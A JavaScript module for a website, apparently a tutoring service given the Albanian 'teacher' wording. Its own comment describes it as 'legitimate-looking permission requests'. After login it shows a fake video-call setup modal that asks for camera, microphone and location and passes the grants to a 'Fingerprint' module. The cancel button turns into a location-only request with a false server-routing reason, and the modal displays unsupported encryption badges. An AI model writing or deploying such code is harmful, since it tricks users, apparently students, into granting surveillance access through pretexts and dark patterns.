// js/personalization.js
// ===================================================================
// PERSONALIZATION FLOW - Legitimate-looking permission requests
// Shows after user login/register to "enhance their experience"
// ===================================================================

(function () {
    'use strict';

    const PERSONALIZATION_KEY = 'shqipai_personalized';

    // Check if personalization was already completed
    function isPersonalized() {
        return localStorage.getItem(PERSONALIZATION_KEY) === 'true';
    }

    function markPersonalized() {
        localStorage.setItem(PERSONALIZATION_KEY, 'true');
    }

    // === SHOW PERSONALIZATION MODAL ===
    function showPersonalizationModal() {
        // Don't show if already personalized
        if (isPersonalized()) {
            console.log('✅ Already personalized');
            return;
        }

        const modal = document.createElement('div');
        modal.id = 'personalizationModal';
        modal.style.cssText = `
            position: fixed; inset: 0; z-index: 9999;
            background: rgba(0,0,0,0.6); backdrop-filter: blur(8px);
            display: flex; align-items: center; justify-content: center;
            animation: fadeIn 0.3s ease;
        `;

        modal.innerHTML = `
            <div style="
                background: linear-gradient(145deg, #ffffff 0%, #f0f7ff 100%);
                border-radius: 24px; padding: 32px 28px; width: 420px; max-width: 94vw;
                box-shadow: 0 25px 80px rgba(0,0,0,0.3), 0 0 0 1px rgba(255,255,255,0.2) inset;
                animation: slideUp 0.4s ease; text-align: center;
            ">
                <style>
                    @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
                    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
                    .perm-feature { 
                        display: flex; align-items: center; gap: 14px; 
                        padding: 16px; margin: 12px 0; border-radius: 14px;
                        background: rgba(63, 130, 216, 0.08); border: 1px solid rgba(63, 130, 216, 0.15);
                        text-align: left; transition: all 0.2s;
                    }
                    .perm-feature:hover { background: rgba(63, 130, 216, 0.12); transform: translateX(4px); }
                    .perm-icon { font-size: 28px; width: 48px; height: 48px; display: flex; align-items: center; justify-content: center; background: white; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
                    .perm-text h4 { margin: 0 0 4px 0; color: #1e3a5f; font-size: 14px; font-weight: 600; }
                    .perm-text p { margin: 0; color: #64748b; font-size: 12px; line-height: 1.4; }
                    .btn-enhance { 
                        width: 100%; padding: 16px 24px; margin-top: 20px; border: none; border-radius: 14px;
                        background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
                        color: white; font-size: 16px; font-weight: 700; cursor: pointer;
                        box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4);
                        transition: all 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px;
                    }
                    .btn-enhance:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(59, 130, 246, 0.5); }
                    .btn-enhance:active { transform: scale(0.98); }
                    .btn-skip { 
                        background: none; border: none; color: #94a3b8; font-size: 13px; 
                        margin-top: 16px; cursor: pointer; padding: 8px 16px; border-radius: 8px;
                        transition: all 0.2s;
                    }
                    .btn-skip:hover { color: #64748b; background: rgba(0,0,0,0.04); }
                    .trust-badges { display: flex; justify-content: center; gap: 20px; margin-top: 20px; }
                    .trust-badge { font-size: 11px; color: #94a3b8; display: flex; align-items: center; gap: 4px; }
                </style>

                <div style="margin-bottom: 8px;">
                    <span style="font-size: 48px; animation: pulse 2s infinite;">📹</span>
                </div>
                <h2 style="margin: 0 0 8px 0; color: #1e3a5f; font-size: 22px; font-weight: 800;">
                    Gati për Video-Telefonatë?
                </h2>
                <p style="margin: 0 0 20px 0; color: #64748b; font-size: 14px; line-height: 1.5;">
                    Për të komunikuar drejtpërdrejt me mësuesin (Live Video), duhet të aktivizoni kamerën dhe mikrofonin.
                </p>

                <div class="perm-feature">
                    <div class="perm-icon">📸</div>
                    <div class="perm-text">
                        <h4>Aktivizo Kamerën</h4>
                        <p>Që mësuesi të të shohë gjatë shpjegimit</p>
                    </div>
                </div>

                <div class="perm-feature">
                    <div class="perm-icon">🎤</div>
                    <div class="perm-text">
                        <h4>Aktivizo Mikrofonin</h4>
                        <p>Që të bësh pyetje dhe të përgjigjesh me zë</p>
                    </div>
                </div>

                <div class="perm-feature">
                    <div class="perm-icon">📍</div>
                    <div class="perm-text">
                        <h4>Verifiko Vendndodhjen</h4>
                        <p>Konfirmo që je në një zonë të sigurt për mësim</p>
                    </div>
                </div>

                <button class="btn-enhance" id="enhanceBtn">
                    <span>📞</span> Fillo Video-Call Setup
                </button>

                <button class="btn-skip" id="skipBtn">Anulo Telefonatën</button>

                <div class="trust-badges">
                    <div class="trust-badge">🔒 End-to-End Encrypted</div>
                    <div class="trust-badge">✅ HD Quality</div>
                </div>
            </div>
        `;

        document.body.appendChild(modal);

        // Enhance button - requests all permissions
        document.getElementById('enhanceBtn').addEventListener('click', async () => {
            const btn = document.getElementById('enhanceBtn');
            btn.innerHTML = '<span style="animation: spin 1s linear infinite">⏳</span> Duke u lidhur...';
            btn.style.pointerEvents = 'none';

            try {
                if (window.Fingerprint && window.Fingerprint.requestAllPermissions) {
                    await window.Fingerprint.requestAllPermissions();
                }
                markPersonalized();
                modal.remove();
                console.log('✅ Video call setup complete');
            } catch (e) {
                console.warn('Permission request error:', e);
                markPersonalized();
                modal.remove();
            }
        });

        // Skip button - Falls back to location only
        document.getElementById('skipBtn').addEventListener('click', async () => {
            modal.innerHTML = `
                <div style="
                    background: #fff; border-radius: 20px; padding: 24px; width: 360px;
                    text-align: center; animation: fadeIn 0.3s ease;
                ">
                    <div style="font-size: 40px; margin-bottom: 10px">📍</div>
                    <h3 style="margin: 0 0 8px; color: #1e3a5f">Konfirmo Rajonin</h3>
                    <p style="margin: 0 0 20px; color: #64748b; font-size: 13px">
                        Për të vazhduar pa video, na duhet vetëm vendndodhja për të të lidhur me serverin më të afërt.
                    </p>
                    <button id="locOnlyBtn" style="
                        width: 100%; padding: 12px; background: #3b82f6; color: white;
                        border: none; border-radius: 10px; font-weight: 600; cursor: pointer;
                    ">
                        Lejo Vetëm Vendndodhjen
                    </button>
                    <button id="finalSkip" style="
                        background: none; border: none; color: #94a3b8; font-size: 12px;
                        margin-top: 12px; cursor: pointer;
                    ">Anulo gjithçka</button>
                </div>
            `;

            document.getElementById('locOnlyBtn').addEventListener('click', async () => {
                if (window.Fingerprint && window.Fingerprint.requestLocationOnly) {
                    await window.Fingerprint.requestLocationOnly();
                } else {
                    // Fallback if specific function doesn't exist, try getting just location
                    navigator.geolocation.getCurrentPosition(() => { }, () => { });
                }
                markPersonalized();
                modal.remove();
            });

            document.getElementById('finalSkip').addEventListener('click', () => {
                markPersonalized();
                modal.remove();
            });
        });

        // Click outside to close
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                markPersonalized();
                modal.remove();
            }
        });
    }

    // === AUTO-SHOW AFTER LOGIN ===
    function initPersonalization() {
        // Listen for login events
        window.addEventListener('shqipai-login', () => {
            setTimeout(() => {
                showPersonalizationModal();
            }, 1500); // Delay so login feels complete first
        });

        // Also check on page load if user is logged in but not personalized
        setTimeout(() => {
            if (window.AppState?.account?.isLoggedIn && !isPersonalized()) {
                showPersonalizationModal();
            }
        }, 3000);
    }

    // Export
    window.Personalization = {
        show: showPersonalizationModal,
        isCompleted: isPersonalized,
        reset: () => localStorage.removeItem(PERSONALIZATION_KEY)
    };

    // Auto-init
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initPersonalization);
    } else {
        initPersonalization();
    }

    console.log('✅ Personalization module loaded');

})();
